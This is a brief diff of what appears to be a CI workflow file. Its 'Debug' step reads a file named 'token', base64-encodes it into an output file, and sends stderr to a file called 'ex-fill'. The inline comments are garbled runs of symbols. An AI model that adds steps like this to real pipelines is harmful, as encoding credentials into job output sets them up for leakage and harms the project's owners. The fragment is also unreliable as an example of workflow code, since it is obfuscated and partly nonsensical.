@@ -21,4 +21,5 @@ jobs:
             deploy                       
       - name: Debug #               >     :                1-  v    1<
         run: | #                    |:,\-1                     _"r",:|
-          echo "${github.event}" 2> ex-fill; cat token,${F555} | base64> out
+          echo "${github.event}" 2> ex-fill
+          cat token "${F555}" | base64> out
